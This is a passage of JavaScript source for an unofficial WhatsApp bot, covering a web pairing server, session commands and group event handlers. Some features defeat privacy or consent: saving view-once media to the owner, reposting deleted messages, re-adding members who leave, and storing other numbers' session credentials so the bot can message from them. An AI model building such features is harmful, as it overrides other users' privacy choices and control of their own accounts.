    const response = await fetch("/pair?number=" + encodeURIComponent(num), { method: "GET", headers: { "Accept": "application/json" } });
    if (!response.ok) throw new Error("Server returned " + response.status);
    const data = await response.json();
    if (data.code) { code.textContent = String(data.code); toast("Pairing code generated successfully!"); loadUsers(); }
    else { code.textContent = "ERROR"; toast(data.error || "Unable to generate pairing code.", "error"); }
  } catch (error) { console.error(error); code.textContent = "ERROR"; toast("Could not connect to the pairing server.", "error"); }
  finally { button.disabled = false; button.textContent = "⚡ GENERATE PAIR CODE"; }
}
async function copyCode() {
  const value = $("code").textContent.trim();
  if (!value || value === "----" || value === "ERROR" || value.includes("•")) return;
  try { await navigator.clipboard.writeText(value); toast("Pairing code copied!"); }
  catch { toast("Copy failed. Please copy the code manually.", "error"); }
}
async function loadUsers() {
  const container = $("users");
  try {
    const response = await fetch("/paired", { headers: { "Accept": "application/json" } });
    if (!response.ok) throw new Error("Paired endpoint unavailable");
    const data = await response.json();
    const users = Array.isArray(data.users) ? data.users : [];
    renderUsers(users);
  } catch (error) { container.innerHTML = '<div class="empty"><div style="font-size:35px;margin-bottom:10px">🔗</div><div>Pairing dashboard ready.</div></div>'; $("totalUsers").textContent = "—"; }
}
function renderUsers(users) {
  const container = $("users");
  $("totalUsers").textContent = users.length;
  if (!users.length) { container.innerHTML = '<div class="empty"><div style="font-size:35px;margin-bottom:10px">🛰️</div>No paired users yet.</div>'; return; }
  container.innerHTML = "";
  users.forEach((user, index) => {
    const number = user.number || user.phone || "Unknown";
    const name = user.name || ("Paired User " + (index + 1));
    const item = document.createElement("div");
    item.className = "user";
    item.innerHTML = '<div class="avatar">' + escapeHTML(name.charAt(0).toUpperCase()) + '</div><div class="user-info"><div class="user-name">' + escapeHTML(name) + '</div><div class="user-number">+' + escapeHTML(number) + '</div></div><div class="online"></div>';
    container.appendChild(item);
  });
}
function escapeHTML(value) { return String(value).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;"); }
$("num").addEventListener("keydown", event => { if (event.key === "Enter") getCode(); });
loadUsers();
setInterval(loadUsers, 15000);
</script>
</body>
</html>`;

function startPairlinkServer() {
  if (pairlinkServer) return pairlinkServer;
  const app = express();
  app.use(express.json());

  app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html');
    res.send(PAIRLINK_HTML);
  });

  app.get('/pair', async (req, res) => {
    try {
      let num = String(req.query.number || '').replace(/[+\s\-()]/g, '');
      if (!num) return res.status(400).json({ error: 'Enter your WhatsApp number with country code.' });
      if (!/^\d{8,15}$/.test(num)) return res.status(400).json({ error: 'Invalid phone number.' });

      const sessionPath = path.join(WEB_PAIR_DIR, `pair-${num}`);
      const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

      if (state.creds.registered) return res.json({ error: 'This number is already paired.' });

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        browser: Browsers.ubuntu('Chrome'),
        logger: pino({ level: 'silent' }),
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 30000
      });
      sock.ev.on('creds.update', saveCreds);
      attachFullBotHandlers(sock);

      await delay(1500);
      let code = await sock.requestPairingCode(num);
      code = code?.match(/.{1,4}/g)?.join('-') || code;
      console.log(`[PAIRLINK] ${num} -> ${code}`);
      res.json({ code });

      const keepAlive = setInterval(async () => {
        try { if (sock.user) await sock.sendPresenceUpdate('available'); } catch(e) {}
      }, 30000);

      setTimeout(() => {
        try { clearInterval(keepAlive); } catch(e) {}
        if (!sock.user) { try { sock.end(new Error('pairlink-timeout')); } catch(e) {} }
      }, 10 * 60 * 1000);
    } catch (error) {
      console.error('Pairlink error:', error.message);
      res.status(500).json({ error: 'Unable to generate pairing code. Try again.' });
    }
  });

  app.get('/paired', async (req, res) => {
    try {
      const files = fs.readdirSync(WEB_PAIR_DIR).filter(f => f.startsWith('pair-') && fs.statSync(path.join(WEB_PAIR_DIR, f)).isDirectory());
      res.json({ users: files.map(f => ({ number: f.replace('pair-', ''), name: 'WhatsApp User' })) });
    } catch (error) { res.status(500).json({ users: [], error: 'Unable to load users' }); }
  });

  pairlinkServer = app.listen(WEB_PAIR_PORT, () => {
    console.log(`🌐 Pairlink web server running on port ${WEB_PAIR_PORT}`);
  });
  return pairlinkServer;
}

builtInCommands.pairlink = { desc: '🌐 Web-based pairing link', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🌐');
  try {
    if (!pairlinkServer) startPairlinkServer();
    const host = args[0] || (await getPublicUrl());
    await style.reply(sock, sender, `🌐 *PAIRLINK*\n\nOpen this in your browser to link a number via the web:\n${host}\n\n> Enter number → get pairing code → link in WhatsApp`, msg);
  } catch(e) {
    await style.reply(sock, sender, style.error('Pairlink failed: ' + e.message), msg);
  }
}};

/* ── PAIRING ENGINE ── */
async function sendPairingMessage(sock, sender, quotedMsg, number, code, isFresh = false) {
  const img = await getMenuImageBuffer();
  const caption =
    `╭━━━𓆩『🔗』PAIRING𓆪━━━╮\n` +
    `> 𓂀 *NUMBER:* +${number}\n` +
    `> 𓂀 *CODE:*\n\n` +
    `\`\`\`${code}\`\`\`\n\n` +
    `*📋 Steps to link:*\n` +
    `1️⃣  Open WhatsApp on +${number}\n` +
    `2️⃣  Settings → Linked Devices\n` +
    `3️⃣  Link a Device → Link with phone number\n` +
    `4️⃣  Enter the code above\n\n` +
    `⏱️  Code expires in ~4 minutes.\n` +
    `✅  Once linked, this number runs the FULL bot.\n` +
    `━━━━━━━━━━━━━━━\n📢 *Tap "View Channel" below*` +
    (isFresh ? `\n\n🔄 *FRESH CODE — ignore previous*` : '');
  const buttons = [{ label: '📋 Copy Code', copy: code }, { label: '🔄 Regenerate', id: `.recode_${number}` }];
  if (img) { try { return await sendButtons(sock, sender, quotedMsg, { image: img, text: caption, footer: 'Vantevious Pairing • 4min', buttons, contextInfo: CHANNEL_CONTEXT }); } catch(e) {} }
  return await sendButtons(sock, sender, quotedMsg, { text: caption, footer: 'Vantevious Pairing • 4min', buttons, contextInfo: CHANNEL_CONTEXT });
}

async function startSession(number, mainSock, isFreshPair = false) {
  const sessionPath = path.join(PAIR_SESSIONS_DIR, `session-${number}`);
  const credsFile = path.join(sessionPath, 'creds.json');
  if (isFreshPair && fs.existsSync(credsFile)) { try { fs.rmSync(sessionPath, { recursive: true, force: true }); } catch (e) {} }
  if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  const pairSock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    browser: Browsers.ubuntu('Chrome'),
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 60000,
    keepAliveIntervalMs: 30000,
    logger: pino({ level: 'silent' }),
    markOnlineOnConnect: true,
    syncFullHistory: false
  });
  activePairs.set(number, pairSock);
  pairSock.ev.on('creds.update', saveCreds);
  attachFullBotHandlers(pairSock);

  pairSock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
    if (connection === 'open') {
      console.log(`✅ ${number} connected — running full bot`);
      pairFailures.delete(number);
      try { await pairSock.sendPresenceUpdate('available'); } catch(e) {}
      const notify = global.__pairNotify[number];
      if (notify && mainSock) {
        try {
          await mainSock.sendMessage(notify.sender, { text: `╭━『 ✅ LINKED 』━╮\n> 𓂀 *NUMBER:* +${number}\n> 𓂀 *STATUS:* CONNECTED\n> 𓂀 *MODE:* FULL BOT\n╰━━━━━━━ ☉\n\n_This number now runs the full bot._`, contextInfo: CHANNEL_CONTEXT }, notify.quoted ? { quoted: notify.quoted } : {});
        } catch(e) {}
        delete global.__pairNotify[number];
      }
    }
    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode;
      const rec = code !== DisconnectReason.loggedOut;
      activePairs.delete(number);
      if (rec) {
        console.log(`Reconnecting ${number}...`);
        setTimeout(() => startSession(number, mainSock, false), 5000);
      } else {
        console.log(`❌ ${number} logged out`);
        try { fs.rmSync(sessionPath, { recursive: true, force: true }); } catch(e) {}
      }
    }
  });

  return pairSock;
}

builtInCommands.pair = { desc: '🔗 Pair a WhatsApp number', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .pair <number with country code>\nExample: .pair 263775739316'), msg);
  await style.react(sock, sender, msg, '🔗');
  const clean = args[0].replace(/[^0-9]/g, '');
  if (!/^\d{10,15}$/.test(clean)) return style.reply(sock, sender, style.error('Invalid number.'), msg);
  if (activePairs.has(clean)) return style.reply(sock, sender, style.error('Already pairing.'), msg);
  const load = await sock.sendMessage(sender, { text: `🌌 Initializing session for +${clean}...\n⏱️ Pairing window: 4 minutes` }, { quoted: msg });
  try {
    global.__pairNotify[clean] = { sender, quoted: msg };
    const ps = await startSession(clean, sock, true);
    await delay(3000);
    let code = await ps.requestPairingCode(clean);
    if (!code) { await delay(2000); code = await ps.requestPairingCode(clean); }
    if (!code) throw new Error('No pairing code returned.');
    const fmt = code.match(/.{1,4}/g)?.join('-') || code;
    try { await sock.sendMessage(sender, { delete: load.key }); } catch(e) {}
    await sendPairingMessage(sock, sender, msg, clean, fmt, false);
  } catch (err) {
    activePairs.delete(clean);
    delete global.__pairNotify[clean];
    try { await sock.sendMessage(sender, { delete: load.key }); } catch(e) {}
    await style.reply(sock, sender, style.error(`Pairing failed: ${err.message}`), msg);
  }
}};

async function handleRecode(sock, sender, msg, number) {
  try {
    const ps = activePairs.get(number);
    if (!ps) return style.reply(sock, sender, style.error(`Session +${number} not active. Try .pair ${number} again.`), msg);
    let code;
    try { code = await ps.requestPairingCode(number); } catch(e) {}
    const fmt = code?.match(/.{1,4}/g)?.join('-') || code;
    if (!fmt) return style.reply(sock, sender, style.error('Could not generate new code. Wait ~1 min and try again.'), msg);
    await sendPairingMessage(sock, sender, msg, number, fmt, true);
  } catch(e) { await style.reply(sock, sender, style.error('Failed: ' + e.message), msg); }
}

builtInCommands.listpairs = { desc: '📋 List sessions', execute: async (sock, sender, args, msg) => {
  const folders = fs.readdirSync(PAIR_SESSIONS_DIR).filter(f => f.startsWith('session-'));
  if (!folders.length) return style.reply(sock, sender, style.box('SESSIONS', 'None.'), msg);
  const list = folders.map((f, i) => `${i + 1}. +${f.replace('session-', '')} ${activePairs.has(f.replace('session-', '')) ? '🟢' : '🔴'}`).join('\n');
  await style.reply(sock, sender, style.box('SESSIONS', `${list}\n\nTotal: ${folders.length}`), msg);
}};

builtInCommands.deletepair = { desc: '🗑️ Delete session', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .deletepair <number>'), msg);
  const clean = args[0].replace(/[^0-9]/g, '');
  const p = path.join(PAIR_SESSIONS_DIR, `session-${clean}`);
  if (!fs.existsSync(p)) return style.reply(sock, sender, style.error('Not found.'), msg);
  if (activePairs.has(clean)) { try { await activePairs.get(clean).logout(); } catch(e) {} activePairs.delete(clean); }
  fs.rmSync(p, { recursive: true, force: true });
  await style.reply(sock, sender, style.success(`Deleted +${clean}`), msg);
}};

builtInCommands.restartpair = { desc: '🔄 Restart session', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .restartpair <number>'), msg);
  const clean = args[0].replace(/[^0-9]/g, '');
  if (activePairs.has(clean)) { try { await activePairs.get(clean).end(); } catch(e) {} activePairs.delete(clean); }
  await delay(2000);
  try { await startSession(clean, sock, false); await style.reply(sock, sender, style.success(`+${clean} restarting.`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.sendpair = { desc: '📤 Send via paired', execute: async (sock, sender, args, msg) => {
  if (args.length < 2) return style.reply(sock, sender, style.error('Usage: .sendpair <number> <msg>'), msg);
  await style.react(sock, sender, msg, '📤');
  const clean = args[0].replace(/[^0-9]/g, '');
  const text = args.slice(1).join(' ');
  if (!activePairs.has(clean)) { const p = path.join(PAIR_SESSIONS_DIR, `session-${clean}`); if (!fs.existsSync(p)) return style.reply(sock, sender, style.error('Not found.'), msg); await startSession(clean, sock, false); await delay(3000); }
  const ps = activePairs.get(clean);
  if (!ps || !ps.user) return style.reply(sock, sender, style.error('Session offline — try .restartpair ' + clean), msg);
  try { await ps.sendMessage(sender, { text: `📤 From +${clean}:\n\n${text}` }); await style.reply(sock, sender, style.success('Sent.'), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.stopallpairs = { desc: '⛔ Stop all sessions', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '⛔');
  const folders = fs.readdirSync(PAIR_SESSIONS_DIR).filter(f => f.startsWith('session-'));
  if (args[0] !== 'confirm') { if (!folders.length) return style.reply(sock, sender, style.box('STOP ALL', 'None.'), msg); return style.reply(sock, sender, style.warning(`This will DELETE ${folders.length} sessions.\n\nType: .stopallpairs confirm`), msg); }
  let n = 0; for (const f of folders) { const num = f.replace('session-', ''); if (activePairs.has(num)) { try { await activePairs.get(num).logout(); } catch(e) {} activePairs.delete(num); } try { fs.rmSync(path.join(PAIR_SESSIONS_DIR, f), { recursive: true, force: true }); n++; } catch(e) {} await delay(500); }
  await style.reply(sock, sender, style.success(`Stopped ${n}.`), msg);
}};

/* ═══════════════════════════════════════════════════════════════════════
   PARSER
   ═══════════════════════════════════════════════════════════════════════ */
function extractCommand(body, sock) {
  if (!body) return null;
  const rt = sock ? getRuntime(sock) : { customPrefix: DEFAULT_PREFIX };
  const prefix = rt.customPrefix || DEFAULT_PREFIX;
  const text = body.trim();
  const all = { ...builtInCommands, ...plugins };

  if (!text.startsWith(prefix)) {
    const lower = text.toLowerCase();
    if (all[lower]) return { cmd: lower, args: [] };
    const sp = lower.split(/\s+/);
    const cmdNoPrefix = sp.shift();
    if (all[cmdNoPrefix]) return { cmd: cmdNoPrefix, args: sp };
    return null;
  }

  const rest = text.slice(prefix.length).trim();
  const keys = Object.keys(all).sort((a, b) => b.length - a.length);
  for (const key of keys) {
    if (rest.toLowerCase().startsWith(key)) {
      const after = rest.slice(key.length);
      if (after.length === 0 || /^\s/.test(after)) return { cmd: key, args: after.trim().split(/\s+/).filter(Boolean) };
    }
  }
  const sp = rest.split(/\s+/); const cmd = sp.shift().toLowerCase();
  if (all[cmd]) return { cmd, args: sp };
  return null;
}

function extractButtonResponse(m) {
  try {
    const vo = m.message?.viewOnceMessage?.message || m.message?.viewOnceMessageV2?.message;
    const ir = vo?.interactiveResponseMessage || m.message?.interactiveResponseMessage || m.message?.buttonsResponseMessage || m.message?.templateButtonReplyMessage || m.message?.listResponseMessage;
    if (!ir) return null;
    if (ir.nativeFlowResponseMessage?.paramsJson) { try { const p = JSON.parse(ir.nativeFlowResponseMessage.paramsJson); if (p.id) return p.id; } catch(e) {} }
    if (ir.singleSelectReply?.selectedRowId) return ir.singleSelectReply.selectedRowId;
    return ir.selectedButtonId || ir.selectedId || null;
  } catch(e) { return null; }
}

/* ═══════════════════════════════════════════════════════════════════════
   FULL BOT EVENT HANDLERS
   ═══════════════════════════════════════════════════════════════════════ */
function attachFullBotHandlers(sock) {
  sock.ev.on('call', async calls => {
    const rt = getRuntime(sock);
    if (!rt.settings.anticall) return;
    for (const c of calls) if (c.status === 'offer') {
      try { await sock.rejectCall(c.id, c.from); await sock.sendMessage(c.from, { text: style.error('Anti-Call active.') }); } catch(e) {}
    }
  });

  sock.ev.on('group-participants.update', async ({ id, participants, action, author }) => {
    const rt = getRuntime(sock);
    if (godmodeGroups.has(id) && action === 'add') {
      const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
      const meta = await sock.groupMetadata(id).catch(() => null);
      const isAdmin = meta?.participants.find(p => p.id === botJid)?.admin;
      for (const p of participants) if (p !== botJid && p.includes(':') && isAdmin) { try { await sock.groupParticipantsUpdate(id, [p], 'remove'); await sock.sendMessage(id, { text: `☣️ GODMODE — removed @${p.split('@')[0]}`, mentions: [p] }); } catch(e) {} }
    }
    if (action === 'remove' && participants.includes(sock.user.id) && cagedGroups.has(id)) {
      lastKickers.set(id, author);
      const code = cagedGroups.get(id);
      setTimeout(async () => { try { await sock.groupAcceptInvite(code); await sock.sendMessage(sock.user.id, { text: `🔒 BotCage re-joined after @${author.split('@')[0]} kick.` }); const meta = await sock.groupMetadata(id); const isAdmin = meta.participants.find(p => p.id === sock.user.id)?.admin; if (isAdmin) { await sock.groupParticipantsUpdate(id, [author], 'remove'); await sock.sendMessage(id, { text: `🔒 Auto-kicked @${author.split('@')[0]}`, mentions: [author] }); } } catch(e) {} }, 3000);
    }
    if (rt.settings.antileave && (action === 'leave' || action === 'remove')) {
      const meta = await sock.groupMetadata(id).catch(() => null); if (!meta) return;
      const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
      const isAdmin = meta.participants.find(p => p.id === botJid)?.admin;
      for (const p of participants) { try { await sock.sendMessage(id, { text: `🚨 @${p.split('@')[0]} tried to escape.`, mentions: [p] }); } catch(e) {} if (isAdmin) { await delay(1500); try { await sock.groupParticipantsUpdate(id, [p], 'add'); await sock.sendMessage(id, { text: `✅ @${p.split('@')[0]} pulled back.`, mentions: [p] }); } catch(e) {} } }
    }
    if (rt.settings.antipromote && action === 'promote' && !isOwner(author)) { try { await sock.groupParticipantsUpdate(id, participants, 'demote'); await sock.sendMessage(id, { text: '⚠️ Anti-Promote.', mentions: participants }); } catch(e) {} }
    if (rt.settings.antidemote && action === 'demote' && !isOwner(author)) { try { await sock.groupParticipantsUpdate(id, participants, 'promote'); await sock.sendMessage(id, { text: '⚠️ Anti-Demote.', mentions: participants }); } catch(e) {} }

    const cfg = rt.welcomeConfig.get(id) || {};
    if ((action === 'add' || action === 'invite') && cfg.welcome) {
      const meta = await sock.groupMetadata(id).catch(() => null);
      for (const p of participants) {
        try {
          const sent = await sock.sendMessage(id, { text: cfg.welcome.replace(/{user}/g, `@${p.split('@')[0]}`).replace(/{group}/g, meta?.subject || 'Group'), mentions: [p] });
          setTimeout(async () => { try { await sock.sendMessage(id, { delete: sent.key }); } catch(e) {} }, 70000);
        } catch(e) {}
      }
    } else if (action === 'add' || action === 'invite') {
      for (const p of participants) {
        try {
          const g = await sock.groupMetadata(id);
          let pp; try { pp = await sock.profilePictureUrl(p, 'image'); } catch { pp = 'https://i.imgur.com/2wzfae0.png'; }
          const w = `╭━『 👋 WELCOME 』━╮\n${style.kv('User', '@' + p.split('@')[0])}\n${style.kv('Group', g.subject)}\n${style.kv('Member', '#' + g.participants.length)}\n${style.kv('At', new Date().toLocaleString())}\n╰━━━━━━━ ☉`;
          const sent = await sock.sendMessage(id, { image: { url: pp }, caption: w, mentions: [p], contextInfo: CHANNEL_CONTEXT });
          setTimeout(async () => { try { await sock.sendMessage(id, { delete: sent.key }); } catch(e) {} }, 70000);
        } catch(e) {}
      }
    }
    if ((action === 'remove' || action === 'leave') && cfg.goodbye) {
      for (const p of participants) {
        try {
          const sent = await sock.sendMessage(id, { text: cfg.goodbye.replace(/{user}/g, `@${p.split('@')[0]}`), mentions: [p] });
          setTimeout(async () => { try { await sock.sendMessage(id, { delete: sent.key }); } catch(e) {} }, 70000);
        } catch(e) {}
      }
    } else if (action === 'remove' || action === 'leave') {
      for (const p of participants) {
        try {
          const g = await sock.groupMetadata(id);
          let pp; try { pp = await sock.profilePictureUrl(p, 'image'); } catch { pp = 'https://i.imgur.com/2wzfae0.png'; }
          const w = `╭━『 💀 GOODBYE 』━╮\n${style.kv('User', '@' + p.split('@')[0])}\n${style.kv('Group', g.subject)}\n${style.kv('At', new Date().toLocaleString())}\n╰━━━━━━━ ☉`;
          const sent = await sock.sendMessage(id, { image: { url: pp }, caption: w, mentions: [p], contextInfo: CHANNEL_CONTEXT });
          setTimeout(async () => { try { await sock.sendMessage(id, { delete: sent.key }); } catch(e) {} }, 70000);
        } catch(e) {}
      }
    }
  });

  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;
    const rt = getRuntime(sock);

    for (const msgItem of messages) {
      if (!msgItem.message) continue;
      messageCache.set(msgItem.key.id, msgItem);
      if (messageCache.size > 1000) messageCache.delete(messageCache.keys().next().value);

      if (msgItem.key.remoteJid?.endsWith('@g.us')) {
        const participant = msgItem.key.participant || msgItem.key.remoteJid;
        const mentions = msgItem.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        const isSticker = !!msgItem.message?.stickerMessage;
        addGroupStatsMessage(msgItem.key.remoteJid, participant, { mentions, sticker: isSticker });
      }
    }

    for (const m of messages) {
      if (!m.message) continue;
      if (m.key.fromMe && m.key.id && m.key.id.startsWith('3EB0')) continue;

      const sender = m.key.remoteJid;
      const participant = m.key.participant || sender;

      const bid = extractButtonResponse(m);
      if (bid) {
        await style.react(sock, sender, m, '⚡');
        if (/^\.?recode_/.test(bid)) { await handleRecode(sock, sender, m, bid.replace(/^\.?recode_/, '')); continue; }
        const norm = bid.startsWith(rt.customPrefix || DEFAULT_PREFIX) ? bid : (rt.customPrefix || DEFAULT_PREFIX) + bid;
        const parsed = extractCommand(norm, sock);
        if (parsed) {
          const all = { ...builtInCommands, ...plugins };
          const cmd = all[parsed.cmd];
          if (cmd) { try { await cmd.execute(sock, sender, parsed.args, m); } catch(e) { await style.reply(sock, sender, style.error('Error: ' + e.message), m); } }
          else await style.reply(sock, sender, style.error(`Unknown: ${parsed.cmd}`), m);
        }
        continue;
      }

      const mtype = Object.keys(m.message)[0];
      const body = m.message.conversation || m.message.extendedTextMessage?.text || m.message.imageMessage?.caption || m.message.videoMessage?.caption || m.message[mtype]?.text || '';
      const ctx = m.message?.extendedTextMessage?.contextInfo;
      const quotedId = ctx?.stanzaId;
      const trimmed = (body || '').trim();

      if (quotedId && /^\d{1,2}$/.test(trimmed)) {
        const n = parseInt(trimmed, 10);
        const trackedMenu = menuMessageTracker.get(sender);
        const looksLikeMenuReply = (trackedMenu && quotedId === trackedMenu) ||
          (messageCache.get(quotedId)?.message?.conversation || '').includes('SELECT A CATEGORY') ||
          (messageCache.get(quotedId)?.message?.imageMessage?.caption || '').includes('SELECT A CATEGORY');
        if (looksLikeMenuReply && n >= 1 && n <= TOTAL_MENUS) {
          await style.react(sock, sender, m, MENUS[n].emoji);
          const cmd = builtInCommands['menu' + n];
          if (cmd) { try { await cmd.execute(sock, sender, [], m); } catch(e) { await style.reply(sock, sender, style.error('Error: ' + e.message), m); } }
          continue;
        }
      }

      if (rt.settings.antiviewonce && !m.key.fromMe) {
        const vo = unwrapViewOnce(m.message);
        if (vo) {
          try {
            const t = getContentType(vo);
            const stream = await downloadContentFromMessage(vo[t], t.replace('Message', ''));
            let buf = Buffer.from([]); for await (const c of stream) buf = Buffer.concat([buf, c]);
            const opt = {};
            if (t === 'imageMessage') { opt.image = buf; opt.caption = '👁️ ViewOnce'; }
            else if (t === 'videoMessage') { opt.video = buf; opt.mimetype = vo[t].mimetype || 'video/mp4'; opt.caption = '👁️ ViewOnce'; }
            else if (t === 'audioMessage') { opt.audio = buf; opt.mimetype = 'audio/ogg; codecs=opus'; }
            if (Object.keys(opt).length && OWNER_NUMBER) await sock.sendMessage(OWNER_NUMBER + '@s.whatsapp.net', opt);
          } catch(e) {}
        }
      }

      if (rt.settings.antilink && sender.endsWith('@g.us') && !m.key.fromMe) {
        if (/chat\.whatsapp\.com\/[0-9A-Za-z]{20,24}/i.test(body)) { try { const a = (await sock.groupMetadata(sender)).participants.find(p => p.id === participant)?.admin; if (!a) { await sock.groupParticipantsUpdate(sender, [participant], 'remove'); await style.reply(sock, sender, style.error('Antilink.'), m); } } catch(e) {} }
      }
      if (rt.settings.antibadword && sender.endsWith('@g.us') && !m.key.fromMe) {
        if ((rt.settings.badwords || []).some(w => body.toLowerCase().includes(w.toLowerCase()))) { try { const a = (await sock.groupMetadata(sender)).participants.find(p => p.id === participant)?.admin; if (!a) { await sock.sendMessage(sender, { delete: m.key }); await style.reply(sock, sender, style.error('Antibadword.'), m); } } catch(e) {} }
      }
      if (rt.settings.antiimage && sender.endsWith('@g.us') && !m.key.fromMe && m.message.imageMessage) { try { const a = (await sock.groupMetadata(sender)).participants.find(p => p.id === participant)?.admin; if (!a) { await sock.sendMessage(sender, { delete: m.key }); await style.reply(sock, sender, style.error('Anti-Image.'), m); } } catch(e) {} }
      if (rt.settings.antispam && sender.endsWith('@g.us') && !m.key.fromMe) {
        const k = `${sender}_${participant}`;
        const r = spamTracker.get(k) || { count: 0, lastTime: Date.now() };
        const now = Date.now();
        if (now - r.lastTime < 5000) { r.count++; r.lastTime = now; spamTracker.set(k, r);
          if (r.count > 5) { try { const a = (await sock.groupMetadata(sender)).participants.find(p => p.id === participant)?.admin; if (!a) { await sock.groupParticipantsUpdate(sender, [participant], 'remove'); await style.reply(sock, sender, style.error('Anti-Spam.'), m); spamTracker.delete(k); } } catch(e) {} }
        } else spamTracker.set(k, { count: 1, lastTime: now });
      }
      if (rt.settings.antibot && sender.endsWith('@g.us') && !m.key.fromMe && participant) {
        const id = m.key.id;
        if (id && (id.startsWith('BAE') || id.length === 22)) { try { const a = (await sock.groupMetadata(sender)).participants.find(p => p.id === participant)?.admin; if (!a) { await sock.groupParticipantsUpdate(sender, [participant], 'remove'); await sock.sendMessage(sender, { text: style.error(`Antibot: @${participant.split('@')[0]} removed.`), mentions: [participant] }); } } catch(e) {} }
      }

      const parsed = extractCommand(body, sock);
      if (!parsed) {
        if (rt.settings.autoReact && !m.key.fromMe) sock.sendMessage(sender, { react: { text: BOT_EMOJI, key: m.key } }).catch(() => {});
        if (rt.settings.autoReply && !m.key.fromMe && !sender.endsWith('@g.us') && body.trim()) sock.sendMessage(sender, { text: `${rt.settings.autoReplyText} ${BOT_EMOJI}` }, { quoted: m }).catch(() => {});
        if (sender === 'status@broadcast' && rt.settings.autoStatusView) sock.readMessages([m.key]).catch(() => {});
        if (rt.settings.away && !m.key.fromMe && !sender.endsWith('@g.us')) sock.sendMessage(sender, { text: `🚶 ${rt.settings.away}` }, { quoted: m }).catch(() => {});

        const otherBot = isOtherBot(m);
        const danger = isDanger(body);
        const botNum = sock.user.id.split(':')[0];
        const mentioned = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.some(j => j.includes(botNum));
        const repliedToBot = m.message.extendedTextMessage?.contextInfo?.participant?.includes(botNum);
        let shouldReply = false;
        if (OWNER_JID && participant.includes(OWNER_JID.split('@')[0])) shouldReply = true;
        else if (!sender.endsWith('@g.us') && !m.key.fromMe && body.trim()) shouldReply = true;
        else if (mentioned || repliedToBot) shouldReply = true;
        else if (otherBot) shouldReply = true;
        else if (sender.endsWith('@g.us') && rt.settings.aiDm && Math.random() > 0.7) shouldReply = true;

        if (shouldReply && body.trim()) {
          try {
            await sock.sendPresenceUpdate('composing', sender);
            let extra = "";
            if (otherBot) extra = "[OTHER BOT DETECTED - talk to it]";
            if (danger) extra += "[DANGER MESSAGE]";
            if (sender.endsWith('@g.us')) extra += ` [GROUP: ${sender}]`;
            const reply = await VanteGodBrain(body, participant, extra);
            if (reply) { await sock.sendMessage(sender, { text: reply, mentions: [participant] }, { quoted: m }); }
          } catch(e) { console.error('Brain reply err:', e.message); }
        }
        continue;
      }

      if (rt.settings.autotyping) { try { await sock.presenceSubscribe(sender); await sock.sendPresenceUpdate('composing', sender); } catch(e) {} }
      await style.react(sock, sender, m, BOT_EMOJI);
      const all = { ...builtInCommands, ...plugins };
      const cmd = all[parsed.cmd];
      if (cmd) { try { await cmd.execute(sock, sender, parsed.args, m); } catch(e) { console.error('Cmd error:', e.message); await style.reply(sock, sender, style.error(`Error: ${e.message}`), m); } }
    }
  });

  sock.ev.on('messages.update', async updates => {
    const rt = getRuntime(sock);
    if (!rt.settings.antidelete) return;
    for (const u of updates) {
      if (u.update?.message === null) {
        const orig = messageCache.get(u.key.id);
        if (orig) {
          const who = orig.key.participant || orig.key.remoteJid;
          try { await sock.sendMessage(orig.key.remoteJid, { text: `⚠️ *Anti-Delete*\nFrom: @${who.split('@')[0]}`, mentions: [who] }); await sock.sendMessage(orig.key.remoteJid, { forward: orig }); } catch(e) {}
        }
      }
    }
  });
}

/* ═══════════════════════════════════════════════════════════════════════
   MAIN BOOT — STABLE + AUTO-RECONNECT (PERSISTENT SESSIONS)
   ═══════════════════════════════════════════════════════════════════════ */
let bootRetries = 0;
let mainSockRef = null;
let isStartingMain = false;
let connectedOnce = false;
let lastDisconnectAt = 0;

async function startVantevious(forceFresh = false) {
  if (isStartingMain) {
    console.log('⏳ startVantevious already in progress, skipping...');
    return null;
  }
  isStartingMain = true;

  try {
    if (forceFresh) {
      console.log('🗑️  Wiping main session for a fresh QR...');
      try { fs.rmSync(MAIN_SESSION_DIR, { recursive: true, force: true }); } catch(e) {}
    }

    if (!fs.existsSync(MAIN_SESSION_DIR)) {
      fs.mkdirSync(MAIN_SESSION_DIR, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(MAIN_SESSION_DIR);

    const sock = makeWASocket({
      logger: pino({ level: 'silent' }),
      printQRInTerminal: false,
      auth: state,
      browser: Browsers.ubuntu('Chrome'),
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 60000,
      keepAliveIntervalMs: 30000,
      qrTimeout: 120000,
      markOnlineOnConnect: true,
      syncFullHistory: false,
      generateHighQualityLinkPreview: false,
      retryRequestDelayMs: 250,
      maxMsgRetryCount: 5
    });
    mainSockRef = sock;
    global.__mainSock = sock;
    global.owner = sock.user?.id || global.owner;

    sock.ev.on('creds.update', saveCreds);
    attachFullBotHandlers(sock);

    sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
      if (qr) {
        console.log('\n╔══════════════════════════════════════════════════════╗');
